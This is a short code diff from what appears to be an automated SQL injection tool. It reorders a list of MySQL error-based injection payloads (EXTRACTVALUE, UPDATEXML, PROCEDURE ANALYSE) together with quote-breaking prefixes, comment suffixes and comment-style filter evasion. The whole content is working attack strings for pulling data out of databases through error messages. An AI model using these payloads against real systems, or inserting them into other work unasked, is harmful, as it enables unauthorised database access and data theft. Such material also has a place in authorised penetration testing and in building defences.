@@ -9,11 +9,11 @@ TITLE = "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clau
 PREFIXES, SUFIXES = (" ", "' ", '" ', ") ", "') "),("", "AND'", "AND 1", "--+-", "%23", "AND '1")
 
 # Test Queries for extractvalue()
-TESTS = ("AND+EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
+TESTS = ("AND UPDATEXML(0,CONCAT/**_**/(0x7e,"+str(Str1)+"),0)",
+         "AND+EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
          "AND+UPDATEXML(0,CONCAT(0x7e,"+str(Str1)+"),0)",
          "Procedure+Analyse(EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+")),1)",
          "AND EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
-         "AND UPDATEXML(0,CONCAT/**_**/(0x7e,"+str(Str1)+"),0)",
          "Procedure Analyse/**_**/(EXTRACTVALUE/**_**/(0,CONCAT/**_**/(0x7e,"+str(Str1)+")),1)",
          "AND EXTRACTVALUE/**_**/(0,CONCAT/**_**/(0x7e,"+str(Str1)+"))",
          "AND EXTRACTVALUE/*!50000(0,CONCAT/*!50000(0x7e,"+str(Str1)+")*/)*/")
